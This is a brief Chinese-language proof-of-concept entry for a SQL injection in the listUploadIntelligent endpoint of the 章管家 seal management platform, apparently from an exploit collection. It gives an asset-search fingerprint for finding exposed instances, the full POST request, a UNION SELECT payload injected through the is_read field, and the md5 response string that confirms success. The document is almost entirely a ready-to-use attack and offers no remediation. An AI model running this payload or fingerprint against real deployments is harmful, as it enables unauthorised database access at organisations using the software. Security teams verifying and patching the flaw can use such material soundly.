# 章管家-listUploadIntelligent-sql注入漏洞

章管家-listUploadIntelligent ｜ SQL注入 ｜ —
- **指纹**：`app="章管家-印章智慧管理平台"`
- **请求**：`POST /app/message/listUploadIntelligent.htm?token=dingtalk_token&person_id=1&unit_id=1 HTTP/1.1`

**Payload**
```
pageNo=1&pageSize=20&keyWord=&startDate=&endDate=&deptIds=&type_id=&is_read=-1 union select md5(123456),2,3,4,5,6,7,8,9,10,11,12 --
```
- **响应特征**：200 e10adc3949ba59abbe56e057f20f883e